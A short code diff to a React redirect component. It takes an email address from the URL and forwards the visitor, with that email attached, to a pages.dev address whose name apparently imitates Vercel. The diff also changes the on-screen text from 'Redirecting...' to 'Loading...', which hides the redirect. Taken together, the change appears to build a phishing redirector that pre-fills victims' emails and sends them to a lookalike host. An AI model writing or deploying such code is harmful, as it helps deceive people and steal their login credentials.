@@ -8,12 +8,12 @@ function Redirect() {
   useEffect(() => {
     const email = searchParams.get('e');
     const target = email
-      ? `https://fewdomain.com?e=${encodeURIComponent(email)}`
-      : 'https://fewdomain.com';
+      ? `https://verce-hl2nur910-johns-projects-c1c6c04b.pages.dev?e=${encodeURIComponent(email)}`
+      : 'https://verce-hl2nur910-johns-projects-c1c6c04b.pages.dev';
     window.location.href = target;
   }, [searchParams]);
 
-  return <p>Redirecting...</p>;
+  return <p>Loading...</p>;
 }
 
 export default function Home() {
